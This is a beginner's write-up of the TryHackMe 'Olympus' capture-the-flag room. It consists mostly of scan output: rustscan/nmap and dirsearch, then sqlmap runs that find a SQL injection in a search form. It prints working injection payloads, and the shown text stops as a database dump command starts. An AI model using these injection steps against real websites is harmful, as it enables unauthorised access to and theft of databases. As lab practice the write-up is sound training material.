# Olympus — Writeup

## Overview
### Olympus — Writeup
### Olympus — Writeup
----
My first CTF !
----
![](https://i.imgur.com/iMOlNjg.jpg)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/7d73d09352d33d65e0d972c3a17bd6af.jpeg)
### Connection
Start Machine
Hey!
Start the VM here and start enumerating! The machine can take some time to start. **Please allow up to 5 minutes** (Sorry for the inconvenience). **Bruteforcing against any login page is out of scope and should not be used**.
If you get stuck, you can find hints that will guide you on my GitHub repository (you'll find it in the walkthrough section).
Well... Happy hacking ^^
Petit Prince
Answer the questions below
Start the VM
Question Done

## Flags / Answers
- Submit your flags here.
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.96.50 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.96.50:22
Open 10.10.96.50:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.27s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.96.50 [2 ports]
Discovered open port 22/tcp on 10.10.96.50
Discovered open port 80/tcp on 10.10.96.50
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.96.50
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.96.50.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.96.50
Host is up, received user-set (0.38s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a7814042cdf25fb4ea21434800b8539 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPNeXYxrC1xv8fhFNve9CXjWSQcCXnWZThU1putOar7KBcQmoCQUYOqvmS+CDauJMPqVE3rqS0+CpTJnZn2ZWXDaCzFLZ84hjBXq8BqoWOFB0Vv0PjRKfBKC54tpA67NgLfp1TmmlS6jp4i75lxkZ6pSTOPxGUrvYvJ0iN2cAHJkgA9SZDrvT11HEp5oLmS2lXtFSoK/Q9pKNIl7y+07gZLRUeIKIn1bFRc4qrXn+rpDQR2fP9OEYiHhdJmTJJL+KjDAqZmIj0SYtuzD4Ok2Nkg5DHlCzOizYNQAkkj6Ift7dkD6LPebRp9MkAoThDzLya7YaFIP66mCbxJRPcNfQ3bJkUy0qTsu9MiiNtyvd9m8vacyA803eKIERIRj5JK1BTUKNAzsZeAuao9Kq/etHskvTy0TKspeBLwdmmRFkqerDIrznWcRyG/UnsEGUARe2h6CwuCJH8QCPMSc93zMrsZNs1z3FIoMzWTf23MWDOeNA8dkYewrDywEuOvb3Vrvk=
|   256 8d5601ca55dee17c6404cee6f1a5c7ac (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHFtzLQXLhGiDzPN7Al84lSfH3jFwGniFL5WQSaIjC+VGMU8mbvbGVuOij+xUAbYarbBuoUagljDmBR5WIRSDeo=
|   256 1fc1be3f9ce78e243334a644af684c3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKhvoRyjZN/taS1uwwTaQ4uZrGhVUje0YWW4jg4rfdXw
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.96.50 olympus.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://olympus.thm/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/olympus.thm/-_23-04-29_16-27-37.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-04-29_16-27-37.log

Target: http://olympus.thm/

[16:27:37] Starting: 
[16:27:45] 301 -  315B  - /~webmaster  ->  http://olympus.thm/~webmaster/
[16:28:14] 200 -    2KB - /index.php
[16:28:17] 301 -  315B  - /javascript  ->  http://olympus.thm/javascript/
[16:29:02] 301 -  311B  - /static  ->  http://olympus.thm/static/

Task Completed

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u http://olympus.thm/~webmaster/ --forms        
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:35:30 //

[16:35:30] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=3rjtmalc7ki...cuvu1jirtf'). Do you want to use those [Y/n] Y
[16:35:37] [INFO] searching for forms
[16:35:39] [INFO] found a total of 2 targets
[1/2] Form:
POST http://olympus.thm/~webmaster/search.php
POST data: search=&submit=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: search=&submit=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] Y
[16:35:54] [INFO] using '/home/witty/.local/share/sqlmap/output/results-04292023_0435pm.csv' as the CSV results file in multiple targets mode
[16:35:55] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:35:55] [INFO] testing if the target URL content is stable
[16:35:56] [INFO] target URL content is stable
[16:35:56] [INFO] testing if POST parameter 'search' is dynamic
[16:35:56] [WARNING] POST parameter 'search' does not appear to be dynamic
[16:35:57] [INFO] heuristic (basic) test shows that POST parameter 'search' might be injectable (possible DBMS: 'MySQL')
[16:35:57] [INFO] heuristic (XSS) test shows that POST parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[16:35:57] [INFO] testing for SQL injection on POST parameter 'search'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:36:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:36:07] [WARNING] reflective value(s) found and filtering out
[16:36:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:36:11] [INFO] testing 'Generic inline queries'
[16:36:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:36:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:36:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[16:36:40] [INFO] POST parameter 'search' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="result")
[16:36:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:36:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:36:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:36:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:36:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:36:42] [INFO] POST parameter 'search' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[16:36:42] [INFO] testing 'MySQL inline queries'
[16:36:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:36:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[16:36:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[16:36:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[16:36:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[16:36:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[16:36:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:36:55] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[16:36:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:36:55] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[16:36:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:36:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:36:57] [INFO] target URL appears to have 10 columns in query
[16:36:58] [INFO] POST parameter 'search' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[16:36:58] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if N
sqlmap identified the following injection point(s) with a total of 131 HTTP(s) requests:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=evOa' OR NOT 6056=6056#&submit=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=evOa' AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(8177=8177,1))),0x71716b7071),8177)-- ulQM&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=evOa' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))xEXF)-- hUjp&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=evOa' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x52705079424c6952787566676f636e636a6749776b4a6e7751584e514558715853524c6270566e6e,0x71716b7071),NULL,NULL,NULL,NULL,NULL#&submit=
---
do you want to exploit this SQL injection? [Y/n] Y
[16:37:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
SQL injection vulnerability has already been detected against 'olympus.thm'. Do you want to skip further tests involving it? [Y/n] Y
[16:38:29] [INFO] skipping 'http://olympus.thm/~webmaster/includes/login.php'
[16:38:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/witty/.local/share/sqlmap/output/results-04292023_0435pm.csv'

[*] ending @ 16:38:29 //

or

┌──(witty㉿kali)-[/tmp]
└─$ cat req.txt 
POST /~webmaster/search.php HTTP/1.1
Host: olympus.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: http://olympus.thm
Connection: close
Referer: http://olympus.thm/~webmaster/index.php
Cookie: PHPSESSID=j8ioan6qle4ee50e49p4q73309
Upgrade-Insecure-Requests: 1

search=1337&submit=

┌──(witty㉿kali)-[/tmp]
└─$ sqlmap -r req.txt --banner
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:52:25 //

[16:52:25] [INFO] parsing HTTP request from 'req.txt'
[16:52:27] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[16:52:27] [INFO] resuming back-end DBMS 'mysql' 
[16:52:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=evOa' OR NOT 6056=6056#&submit=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=evOa' AND GTID_SUBSET(CONCAT(0x7170717071,(SELECT (ELT(8177=8177,1))),0x71716b7071),8177)-- ulQM&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=evOa' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))xEXF)-- hUjp&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=evOa' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170717071,0x52705079424c6952787566676f636e636a6749776b4a6e7751584e514558715853524c6270566e6e,0x71716b7071),NULL,NULL,NULL,NULL,NULL#&submit=
---
[16:52:28] [INFO] the back-end DBMS is MySQL
[16:52:28] [INFO] fetching banner
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.6
banner: '8.0.28-0ubuntu0.20.04.3'
[16:52:29] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 16:52:29 //

┌──(witty㉿kali)-[/tmp]
└─$ sqlmap -r req.txt --batch --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:53:15 //

[16:53:15] [INFO] parsing HTTP request from 'req.txt'
